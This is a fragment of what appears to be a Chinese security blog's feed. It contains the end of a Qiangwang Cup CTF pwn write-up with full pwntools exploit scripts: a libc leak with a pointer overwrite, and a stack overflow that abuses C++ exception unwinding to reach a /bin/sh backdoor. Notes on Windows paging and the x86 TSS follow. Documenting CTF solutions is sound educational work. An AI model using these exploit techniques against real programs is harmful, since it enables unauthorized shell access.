class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.231.2&#x27;,)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, payload</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;show:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">env</span>(<span class="params">ch</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;sad !&#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr1,payload</span>):</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;addr&#x27;</span>,p64(addr1))</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">write(libc_addr+<span class="number">0x21a118</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">env(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>第二种方法当然是可以用 Largebin Attack 去打，但是过于复杂，可能自己还没学会，主要在于分享自己的 EXP 和做题思路了，就不增加额外的工作量。</p><h2 id="expect-number"><a href="#expect-number" class="headerlink" title="expect_number"></a>expect_number</h2><p><a href="expect_number_cf786f84f8b86260b7eac1628ad682a8.zip">附件下载</a></p><p>这题没给 libc，应该题目自己有提权或者是给 flag 的东西，运行它输出的话，需要让我们最终计算得到 <code>0x4F5DA2</code> 这个值。</p><p>也是一个很经典的菜单</p><img src="/2024/11/07/qwb2024_pre/12.png" class=""><p>选项 1 发现它会根据随机 <code>1~4</code> 之间的整数来判断当前对数字做四则运算，1、2、3、4 分别对应了加、减、乘、除，并且另一个运算的数字只能是 0 1 2。既然是随机，那么交叉一下 srand 函数看看它是用了什么种子。</p><img src="/2024/11/07/qwb2024_pre/13.png" class=""><p>虽然调用了 time 函数，但是使用了 1 作为种子，因此序列是固定的，可以自己也编写一个 C 语言程序去输出这个序列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">288</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,rand()%<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免被怀疑水长度，这里 288 个数字不展示了，仅在最后 EXP 展示。</p><p>很显然的，加减如果是 0，那么这次加减是无效的，乘除如果是 1，这次乘除也是无效的，来先看看指定数值的判断逻辑。</p><img src="/2024/11/07/qwb2024_pre/14.png" class=""><p>它只判断最后的那一个字节是否为 a8，自己构造序列也挺简单，遇到除法就给 1，遇到减法就给 0，结果发现再一次加法中突然报错了。</p><p>顺着报错找到代码</p><img src="/2024/11/07/qwb2024_pre/15.png" class=""><p>看了一下可能我的数值不超过 0x100，但是发现 &gt;0x80 的数被识别为了负数，前面将char类型做了符号扩展之后又转为无符号整数，自然就超出范围了。</p><p>这里举个例子构造 0x82，再次尝试加法的时候结果为 0x80于是进入里面的逻辑</p><img src="/2024/11/07/qwb2024_pre/16.png" class=""><p>可以发现它先做了零扩展（movzx），再做了符号扩展（movsx），因此下一步 RAX 的值变为了 <code>0xffffff80</code>，对于res来说，它是 -80 了，再+2变为 -78，转为无符号整数之后自然就超过了 0x100</p><img src="/2024/11/07/qwb2024_pre/17.png" class=""><p>因此如果想算出超过 0x80 的字节，必须算到对应的 &#x2F;2 的形式，而且最后一个运算符必须是 <code>*2</code>，结果只能是偶数，不能结果不能超过一个字节。</p><p>这些结论做稍加的数学推导应该很容易发现，但是当你好不容易凑好 0x54，再乘 2 得到 0xa8 的时候，会发现，远程 gift 是没有这个文件的。</p><img src="/2024/11/07/qwb2024_pre/18.png" class=""><p>咨询出题人（合理的咨询是不违反比赛规则的）后发现这是正常情况</p><img src="/2024/11/07/qwb2024_pre/19.png" class=""><p>那么题目就不是让我们执行这个 <code>system(&quot;cat gift&quot;)</code> 了，闲来无事去找字符串的时候发现 <code>/bin/sh</code>，发现在输入选项的时候有一个后门。</p><img src="/2024/11/07/qwb2024_pre/20.png" class=""><p>发现 cin 被 try 包裹了，如果出现运行时错误，那么就执行 <code>system(&quot;/bin/sh&quot;)</code>，而试过了各种输入都无法触发，一再陷入僵局，后面发现了退出函数有一个函数指针的调用。</p><img src="/2024/11/07/qwb2024_pre/21.png" class=""><p>正常情况下就是输出 <code>Good Bye</code>，于是想到能否将结果覆盖到上面，计算的数值的结构体是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">calc</span>&#123;</span></span><br><span class="line"><span class="type">char</span> *unknown;</span><br><span class="line"><span class="type">int</span> rounds;</span><br><span class="line"><span class="type">char</span> num[<span class="number">288</span>];</span><br><span class="line"><span class="type">char</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而我们的数值是随着 round 增加保存在后面的，查看是否有机会覆盖函数指针，结构体地址在 <code>5400</code>，而函数指针在 <code>5520</code>，显然我们足以覆盖这个函数指针。</p><img src="/2024/11/07/qwb2024_pre/22.png" class=""><p>具体字段图中标出，我们有机会覆盖任意字节到函数指针的低位。</p><p>于是找各种可能的情况，在 4c00 的地址 0x100 字节范围内看看有什么能修改的。</p><img src="/2024/11/07/qwb2024_pre/23.png" class=""><p>这里大概率都是虚函数表，发现 0x60 偏移处有一个栈溢出，栈溢出刚好足以让我们覆盖返回地址。</p><img src="/2024/11/07/qwb2024_pre/24.png" class=""><p>同时发现它主动检测溢出了会抛出运行时异常，运行时异常 emm，是不是可以和前面结合一下呢，答案是可以的，我们来了解一下C++如何处理异常的。我们都知道，在严格的异常处理流程，一个函数如果有可能抛出异常，要么你声明它本身也是可以抛出异常，要么将可能抛出异常的函数用 try 包裹。</p><p>C++ 如何实现多级的 try 判断呢，答案是栈回溯，它会寻找调用栈，判断之前的函数有没有被 try 包裹，有的话尝试捕获去处理。正常情况下这种设计当然没问题，如果返回值地址被我们修改的话，它就会根据返回值地址的值去寻找调用栈，那么此时我就可以尝试将这个抛出的异常在 cin 输入那里去捕获，然后完成 <code>system(&quot;/bin/sh&quot;)</code> 的调用。</p><p>并且 show 功能可以输出程序基地址，也不用去爆破了。</p><p>最后一点需要注意的是，看到后门这里，它有一条写栈内存的指令，因此在溢出的时候，RBP 要设为一个可写的地址。</p><p>最终 EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./expect_number&#x27;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;39.106.48.123&#x27;,32818)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">seq=<span class="string">&quot;4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">seqnum=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> seq]</span><br><span class="line">target=<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">now=<span class="number">0</span></span><br><span class="line">ch=<span class="number">0</span></span><br><span class="line">k=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seqnum:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        k += <span class="string">&#x27;2&#x27;</span></span><br><span class="line">        now += <span class="number">2</span></span><br><span class="line">        <span class="comment"># if now == target-2:</span></span><br><span class="line">        <span class="comment">#     gdb.attach(p)</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">2</span>:</span><br><span class="line">        k += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ch+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> now==target:<span class="keyword">break</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seqnum[ch:-<span class="number">0xc</span>]:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span> <span class="keyword">or</span> i==<span class="number">2</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">        k += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;or 0&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        k += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(k)</span><br><span class="line">addr=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x4c60</span></span><br><span class="line">success(<span class="string">&#x27;code: &#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p64(addr+<span class="number">0x5080</span>)+p64(addr+<span class="number">0x251A</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Tell me your favorite number.&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地运行结果</p><img src="/2024/11/07/qwb2024_pre/25.png" class=""><p>远程运行结果（纪念一下hh）</p><img src="/2024/11/07/qwb2024_pre/26.png" class=""><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>能打出两题还是挺开心的，感谢强网杯提供的高质量赛题（就是rs和go没学过后面就坐牢了），不管是从考点还是利用难度来说，题目出的都是非常棒的。</p>]]></content>
    
    
    <summary type="html">本次强网杯初赛做出两道pwn题，把详细题解写一下记录。</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8初赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%88%9D%E8%B5%9B/"/>
    
    <category term="Pwn" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%88%9D%E8%B5%9B/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>windows内核（1）——分页</title>
    <link href="https://xia0ji233.github.io/2024/11/07/WindowsKernel1/"/>
    <id>https://xia0ji233.github.io/2024/11/07/WindowsKernel1/</id>
    <published>2024-11-07T05:00:00.000Z</published>
    <updated>2025-01-17T10:46:28.491Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始正式学习分页的相关知识</p><span id="more"></span><h2 id="分页与物理地址"><a href="#分页与物理地址" class="headerlink" title="分页与物理地址"></a>分页与物理地址</h2><h3 id="什么是物理地址"><a href="#什么是物理地址" class="headerlink" title="什么是物理地址"></a>什么是物理地址</h3><p>在学习二进制的时候就有区分过物理地址和虚拟地址这两个概念，其实就是内存条真正的地址，这里不再赘述。而学习保护模式我们知道，实际的线性地址 &#x3D; 逻辑地址+段寄存器.base，在汇编和C指针层面所使用的地址都是逻辑地址。但是似乎它等同于虚拟地址（线性地址），这是因为通常情况下段寄存器的 base 都为 0。</p><h3 id="10-10-12分页详解"><a href="#10-10-12分页详解" class="headerlink" title="10-10-12分页详解"></a>10-10-12分页详解</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>拿到一个32位的地址，将其结构进行拆分</p><img src="/2024/11/07/WindowsKernel1/1.png" class=""><p>这就是 10-10-12 分页的命名由来，而去寻找对应的物理页也是根据每个进程的 Cr3 寄存器的值去找到，整体分页结构如下图所示</p><img src="/2024/11/07/WindowsKernel1/2.png" class=""><p>同时我们也可以看到，不同的虚拟页是可以映射同一个物理页的，下面来介绍一下 PDE 和 PTE 的基本结构。</p><h4 id="物理页的属性"><a href="#物理页的属性" class="headerlink" title="物理页的属性"></a>物理页的属性</h4><img src="/2024/11/07/WindowsKernel1/3.png" class=""><p>下面描述一下各个位的作用：</p><ul><li>P 位：表示<code>PDE</code>或者<code>PTE</code>是否有效，如果有效为<code>1</code>，反之为<code>0</code>。</li><li>R&#x2F;W 位：如果<code>R/W = 0</code>，表示是只读的，反之为可读可写。</li><li>U&#x2F;S 位：如果<code>U/S = 0</code>，则为特权用户（super user），即非3环权限。反之，则为普通用户，即为3环权限。</li><li>PS位：这个位只对<code>PDE</code>有意义。如果<code>PS == 1</code>，则<code>PDE</code>直接指向物理页，不再指向<code>PTE</code>，低22位是页内偏移。它的大小为<code>4MB</code>，俗称“大页”。</li><li>A 位：是否被访问，即是否被读或者写过，如果被访问过则置<code>1</code>。</li><li>D 位：脏位，指示是否被写过。若没有被写过为<code>0</code>，被写过为<code>1</code>。</li><li>G 位：表示是否为全局页。它的作用是什么呢？举个例子，操作系统的进程的高<code>2G</code>映射基本不变，如果<code>Cr3</code>改了，<code>TLB</code>刷新重建高<code>2G</code>以上很浪费。所以<code>PDE</code>和<code>PTE</code>中有个<code>G</code>位，如果为1，刷新<code>TLB</code>时将不会刷新它指向的页。</li><li>PWT 位：当<code>PWT = 1</code>，写缓存的时候也要将数据写入内存中。</li><li>PCD 位：当<code>PCD = 1</code>时，禁止某个页写入缓存，直接写内存。比如，做页表用的页，已经存储在TLB中了，可能不需要再缓存了。</li></ul><p>需要注意的是</p><ul><li><code>PTE</code> 可以没有物理页，且只能对应一个物理页。</li><li>多个<code>PTE</code>也可以指向同一个物理页。</li><li><code>PDE</code>和<code>PTE</code>重合的属性共同决定着最终物理页的属性。比如 P 位，如果有一个是 0，那么最终的物理页就是无效的。但是<code>PDE</code>和<code>PTE</code>它们的属性的影响范围是不一样的。数值上：物理页的属性 &#x3D; PDE属性 &amp; PTE属性。</li></ul><h2 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h2><p>对于一个给定的线性地址，比如我们执行<code>mov eax,ds:[0x12345678]</code>这句汇编指令的时候，<code>0x12345678</code>这个线性地址会传递给<code>CPU</code>，先查询<strong>TLB</strong>（页表缓存）和<strong>缓存</strong>有没有，有的话直接取出来返回；如果没有，经过 MMU（Memory Management Unit，内存管理单元）处理得到物理地址，通过固定的分页模式直接找到，取出数据返回。</p><p>TLB大概就是一张表，根据线性地址和 CR3 的值去找物理页地址，如果命中，MMU将可以快速完成翻译。如果 TLB 没有对应的项，则往后会查页表的缓存，查到了也会快速返回，否则只能够去一次一次访存查询页表（这里具体的过程还没有特别弄懂，mark一下，写了新的回来补）。</p><img src="/2024/11/07/WindowsKernel1/4.png" class=""><p>上面我们经历了一遍翻译的过程，具体我们需要给入几个参数：页表基址（物理地址），线性地址，数据，寄存器，读写信号，这也就解释了为什么 CPU 不允许直接交换两个位置的内存，如果允许则这方面处理将比较麻烦，何况并不是说不提供交换内存的指令就无法实现一些功能。</p><h3 id="页表学习准备"><a href="#页表学习准备" class="headerlink" title="页表学习准备"></a>页表学习准备</h3><p>笔者用的系统是 Win7 32 位的，虽然现在 32 位的系统几乎用的很少了，但是为了系统的学习还是从简单的开始。Win7 32 默认是 2-9-9-12 分页，先用几个指令配置为更简单的 10-10-12 分页。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set pae ForceDisable  </span><br><span class="line">bcdedit /set nx AlwaysOff </span><br></pre></td></tr></table></figure><p>如果要关闭那么用下面两个指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set pae forceEnable</span><br><span class="line">bcdedit /set nx OptIn</span><br></pre></td></tr></table></figure><p>这样就回到了 2-9-9-12 分页。</p><ul><li>如果是2-9-9-12分页运行的内核 ntkrnlpa.exe</li><li>如果是10-10-12分页运行的内核 ntoskrnl.exe</li></ul><h3 id="地址翻译练习"><a href="#地址翻译练习" class="headerlink" title="地址翻译练习"></a>地址翻译练习</h3><p>但是物理地址与之完全不一样，先可以尝试通过 windbg 练习寻找物理地址，这里使用记事本配合CE。</p><img src="/2024/11/07/WindowsKernel1/5.png" class=""><p>那么得到线性地址是 <code>0029DFB0</code>，根据 10-10-12 分页规则，将页表拆开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000 1010011101 111110110000</span><br></pre></td></tr></table></figure><p>这三部分分别是，页目录项（PDE），页表项（PTE），页内偏移（offset）。</p><img src="/2024/11/07/WindowsKernel1/6.png" class=""><p>找到页表基址，获得页目录项的地址，即 <code>DirBase+4*PDE</code>。在这里页表项地址就是 <code>DirBase</code>，随后跟过去，这里需要注意，这个地址并不是真的地址，而是因为每个页表项它有一定的大小。可能装下一个页目录项就要完整的一个页，如果是这样就决定了页目录项的地址一定是页对齐的（最低三位十六进制地址为0），所以我们找到的地址再把最低三位十六进制置为0就是真实的页目录项了，而通过前面的学习也可以看到，最低的十二个位被赋予了特殊的含义。</p><p>我们找到的该内存页目录项地址实际上就是 <code>ad688000</code>，然后再页目录项中找到页表项 <code>1010011101</code> 转为十六进制得到 <code>29d</code>，同样的，页目录项地址+4*PTE 得到页的物理地址，也就是 <code>ad688a74</code>。</p><img src="/2024/11/07/WindowsKernel1/7.png" class=""><p>同样的，这里低三位十六进制也不是真实的地址，需要清零得到该页的页表基址，最后再加上页内偏移，也就是 FB0。</p><img src="/2024/11/07/WindowsKernel1/8.png" class=""><p>成功找到对应的物理内存。</p><p>而我们的 CR3 寄存器存储的就是页目录表的物理地址，即 Page Director Table，那么所说的 PDE 当然就是 Page Director Entry了。PTE 就是 Page Table Entry，对应的每个目录项指向的是一个 PTT，Page Table Table。</p><h2 id="页目录表基址与页表基址"><a href="#页目录表基址与页表基址" class="headerlink" title="页目录表基址与页表基址"></a>页目录表基址与页表基址</h2><p>由于物理地址对操作系统是不可见的，所以操作系统必须有线性访问页表的能力，唯一的办法就是将自身的页表挂在一个特殊的地址上，这个地址是 0xC0300000。</p><img src="/2024/11/07/WindowsKernel1/9.png" class=""><p>也可以发现，CR3 对应的物理地址与线性地址 0xC0300000 是一致的。</p><p>相同与页目录表基址，为了在程序内快速访问页表，也有一个页表基址，页表基址对应的线性地址是 0xC0000000。</p><p>这里记一下通过线性地址寻找PTE和PDE的公式。</p><ul><li>访问页目录表的公式：<code>0xC0300000 + PDI * 4</code></li><li>访问页表的公式：<code>0xC0000000 + PDI * 4096 + PTI * 4</code></li></ul><p>很有趣的是，你会发现如果你要寻找 0xC0300000 对应的页表，用第二个公式代入就是它本身。即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xC0300000</span><br><span class="line"></span><br><span class="line">高10位：  1100 0000 00   =   0x300</span><br><span class="line">中间10位：1100 0000 00   =   0x300</span><br><span class="line">低12位：  0000 0000 0000 =   0x000</span><br></pre></td></tr></table></figure><p>代入第二个公式可得 <code>0xC0000000 + 0x300 * 4096 + 0x300 * 4 = 0xC0300000</code></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15363603.html">https://www.cnblogs.com/wingsummer/p/15363603.html</a></li><li>[2]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_4/">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_4&#x2F;</a></li></ul>]]></content>
    
    
    <summary type="html">今天开始正式学习分页的相关知识</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="分页" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E5%88%86%E9%A1%B5/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（4）——任务门</title>
    <link href="https://xia0ji233.github.io/2024/11/04/x86_4/"/>
    <id>https://xia0ji233.github.io/2024/11/04/x86_4/</id>
    <published>2024-11-03T18:00:00.000Z</published>
    <updated>2025-01-17T10:39:23.426Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下任务门相关的知识</p><span id="more"></span><p>从堆栈切换开始说起，不管是中断、陷入还是调用，提权之后 ESP 和 SS 都会被切换到对应权限的栈，那么必然有一个地方会维护这个栈所在的位置，其实就是使用任务段去维护的。</p><h2 id="任务段"><a href="#任务段" class="headerlink" title="任务段"></a>任务段</h2><h3 id="任务段介绍"><a href="#任务段介绍" class="headerlink" title="任务段介绍"></a>任务段介绍</h3><p>任务状态段简称任务段，英文缩写为<code>TSS</code>，<code>Task-state segment</code>，任务段的结构体如下所示，大小为 104 字节。</p><img src="/2024/11/04/x86_4/1.png" class=""><p>观察结构体成员，可以很明显地看到有 SS2，ESP2，SS0，ESP0 等字段，没错，这就是保存相对应任务2环和0环的堆栈信息的。<code>Intel</code> 的设计 <code>TSS</code> 目的肯定主要就是实现任务切换。<code>CPU</code> 的任务在操作系统的方面就是线程。任务一切换，执行需要的环境就变了，即所有寄存器里面的值，需要保存供下一次切换到该任务的时候再换回去重新执行。但是事实上，线程切换并不走 TSS，而是操作系统自己实现了线程切换的逻辑[1]，据说是因为 <code>intel</code> 自带的任务切换逻辑过慢[2]。</p><p><code>CPU</code> 要找到 <code>TSS</code> 需要通过 <code>TR</code> 段寄存器，<code>TR</code> 也是一个内核寄存器，<code>CPU</code> 通过 <code>TR</code> 寄存器找到 <code>TSS</code> 的方式如下图所示：</p><img src="/2024/11/04/x86_4/2.png" class=""><p>可以看到，<code>CPU</code> 保存任务段选择子在 <code>TR</code> 寄存器中，将具体的任务段描述符保存在 <code>GDT</code> 表中。</p><p>任务段描述符的段描述符结构如下</p><img src="/2024/11/04/x86_4/3.png" class=""><p>其余位基本一样了，注意这里的 B 表示任务段是否被加载进 <code>TR</code> 